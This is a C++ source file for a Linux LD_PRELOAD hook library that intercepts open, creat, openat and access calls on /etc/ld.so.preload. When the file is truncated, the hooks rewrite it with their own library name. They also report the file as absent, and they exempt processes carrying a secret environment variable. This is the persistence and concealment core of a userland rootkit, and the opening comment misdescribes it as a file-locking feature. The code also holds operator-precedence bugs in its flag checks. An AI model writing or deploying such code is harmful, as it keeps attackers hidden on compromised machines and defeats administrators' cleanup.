
#include "main.h"

//
// Linux maintain mandatory lock for file with
// guid enable bit and goup execute disabled.
//



int open(const char *pathname, int flags, mode_t mode) {
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
	std::string file (pathname);
	char chArr[2], *chPtr;
	int ret;
	ssize_t ind;
	
	
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	assert (pwrPtr != NULL);
	
	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
		if ((ret = opnPtr (pathname, flags, mode)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	// Is the ld.so.preload opening ?
	if (!strcmp (prelFileName, file.c_str ())) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd);
		
		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
		
		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
		if (-1 == ind) {
			if (flags & O_CREAT) {
				if ((ret = opnPtr (pathname, flags & (~O_TRUNC), mode)) == -1) {
					serr.set (errno);
				}
				return ret;
			}
			else {
				serr.set (ENOENT);
				return -1;
			}
		}
		// the file doesn't exist
		if (chArr[0] == not_created) {
			if (!flags & O_CREAT) {
				serr.set (ENOENT);
				return -1;
			}
			else {
				if ((ret = opnPtr (pathname, flags & (~O_TRUNC), mode)) == -1) {
					serr.set (errno);
					return ret;
				}
				while (pwrPtr (*fd, &created, 1, 0) == -1 && errno == EINTR);
				return ret;
			}
		}
		// the file created
		if (flags & O_TRUNC) {
			if ((ret = opnPtr (pathname, O_RDWR | O_TRUNC, 0)) == -1) {
				serr.set (errno);
				return ret;
			}
			
			while (pwrPtr (ret,
						   (hookLibraryName + separator).c_str () ,
						   (hookLibraryName + separator).size (),
						   0
				  ) == -1 && errno == EINTR
			);
			while (pwrPtr (*fd,
						   (std::string (1, created) + not_writed).c_str (),
						   (std::string (1, created) + not_writed).size (),
						   0
				  ) == -1 && errno == EINTR
			);
			
			close (ret);
			if ((ret = opnPtr (pathname, flags & (~O_TRUNC), mode)) == -1) {
				serr.set (errno);
			}
			return ret;
		}
		
		// the file have created and we wan't to overwrite it
		if ((ret = opnPtr (pathname, flags, mode)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	
	// this file isn't intersted for us
	if ((ret = opnPtr (pathname, flags, mode)) == -1) {
		serr.set (errno);
	}
	return ret;
}

int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	CREAT crtPtr = (CREAT)dlsym (RTLD_NEXT, "creat");
	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
	std::string file (pathname);
	char *chPtr;
	int ret;
	
	
	assert (opnPtr != NULL);
	assert (pwrPtr != NULL);
	assert (crtPtr != NULL);
	
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
		if ((ret = crtPtr (pathname, mode)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	if (!strcmp (prelFileName, file.c_str ())) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd);
		
		int ret = crtPtr (pathname, mode);
		if (ret == -1) {
			serr.set (errno);
			return ret;
		}
		while (pwrPtr (ret,
					   (hookLibraryName + separator).c_str (),
					   (hookLibraryName + separator).size (),
					   0
			  ) == -1 && errno == EINTR
		);
		while (pwrPtr (*fd,
					   (std::string (1, created) + not_writed).c_str (),
					   (std::string (1, created) + not_writed).size (),
					   0
			  ) == -1 && errno == EINTR
		);
		
		return ret;
	}
	
	
	if ((ret = crtPtr (pathname, mode)) == -1) {
		serr.set (errno);
	}
	return ret;
}

int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
	CErrnoSaver serr;
	OPENAT opnAtPtr = (OPENAT)dlsym (RTLD_NEXT, "openat");
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
	std::string file (pathname), clearName, lnkAim;
	char chArr[2], *chPtr;
	int ret;
	ssize_t ind;
	
	
	assert (opnAtPtr != NULL);
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	assert (pwrPtr != NULL);
	
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
		if ((ret = opnAtPtr (dirfd, pathname, flags, mode)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	clearName = getClearName (file);
	if (dirfd == AT_FDCWD)
		lnkAim = getCwdEasy ();
	else
		lnkAim = readLinkName (("/proc/self/fd/" + intToString (dirfd)).c_str ());
	
	// Is the ld.so.preload opening ?
	if (!strcmp (prelFileName, file.c_str ()) ||
		!strcmp (prelFileNameClear, clearName.c_str ()) ||
		!strcmp (lnkAim.c_str (), linuxConfigPath)
		)
	{
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd);
		
		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
		
		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
		if (-1 == ind) {
			if (flags & O_CREAT) {
				if ((ret = opnAtPtr (dirfd, pathname, flags & (~O_TRUNC), mode)) == -1) {
					serr.set (errno);
				}
				return ret;
			}
			else {
				serr.set (ENOENT);
				return -1;
			}
		}
		// the file doesn't exist
		if (chArr[0] == not_created) {
			if (!flags & O_CREAT) {
				serr.set (ENOENT);
				return -1;
			} else {
				if ((ret = opnAtPtr (dirfd, pathname, flags & (~O_TRUNC), mode)) != -1) {
					while (pwrite (*fd, &created, 1, 0) == -1 && errno == EINTR);
				} else {
					serr.set (errno);
				}
				return ret;
			}
		}
		// the file exists
		if (flags & O_TRUNC) {
			if ((ret = opnAtPtr (dirfd, pathname, O_RDWR | O_TRUNC, 0)) == -1) {
				serr.set (errno);
				return ret;
			}
			
			while (pwrPtr (ret,
						   (hookLibraryName + separator).c_str (),
						   (hookLibraryName + separator).size (),
						   0
				  ) == -1 && errno == EINTR
			);
			while (pwrPtr (*fd,
						   (std::string (1, created) + not_writed).c_str (),
						   (std::string (1, created) + not_writed).size (),
						   0
				  ) == -1 && errno == EINTR
			);
			
			close (ret);
			if ((ret = opnAtPtr (dirfd, pathname, flags & (~O_TRUNC), mode)) == -1) {
				serr.set (errno);
			}
			return ret;
		}
		// the file have created and we wan't to overwrite it
		return opnAtPtr (dirfd, pathname, flags, mode);
	}
	
	// this file isn't intersted for us
	if ((ret = opnAtPtr (dirfd, pathname, flags, mode)) == -1) {
		serr.set (errno);
	}
	return ret;
}

int access(const char *pathname, int mode) {
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	ACCESS acsPtr = (ACCESS) dlsym (RTLD_NEXT, "access");
	std::string fileName (pathname);
	size_t ind;
	char chArr[2], *chPtr;
	int ret;
	
	
	assert (acsPtr != NULL);
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	
	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
		if ((ret = acsPtr (pathname, mode)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	fileName = getClearName (fileName);
	if (!strcmp (fileName.c_str (), prelFileNameClear)) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd);
		
		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
		if (ind == -1) {
			serr.set (ENOENT);
			return -1;
		}
		if (chArr[0] == created) {
			if ((ret = acsPtr (pathname, mode)) == -1) {
				serr.set (errno);
			}
			return ret;
		}
		else {
			serr.set (ENOENT);
			return -1;
		}
	}
	
	
	if ((ret = acsPtr (pathname, mode)) == -1) {
		serr.set (errno);
	}
	return ret;
}













